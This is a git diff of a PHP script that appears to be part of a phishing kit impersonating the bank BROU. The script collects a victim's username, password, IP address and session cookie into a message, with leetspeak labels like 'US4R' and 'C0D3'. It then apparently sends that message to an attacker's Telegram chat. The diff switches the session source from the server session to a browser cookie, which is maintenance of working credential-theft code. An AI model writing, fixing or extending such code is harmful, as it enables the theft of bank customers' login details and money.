@@ -1,6 +1,6 @@
 <?php
 
-session_start();
+
 ini_set("display_errors", 0);
 
 $config = include('config.php');
@@ -13,7 +13,7 @@ $chat_id = $config['chat_id'];
 
 
 $ip = $_SERVER['REMOTE_ADDR'];
-$sesion = isset($_SESSION['breves']) ? $_SESSION['breves'] : '';
+$sesion = isset($_COOKIE['breves']) ? $_COOKIE['breves'] : '';
 
 $mensaje_para_chatbot = "🔐🔵3BROU🔵\nUS4R: " . $elusr . "\nC0D3: " . $elpax . "\nip: " . $ip . "\nsesion: " . $sesion;
 
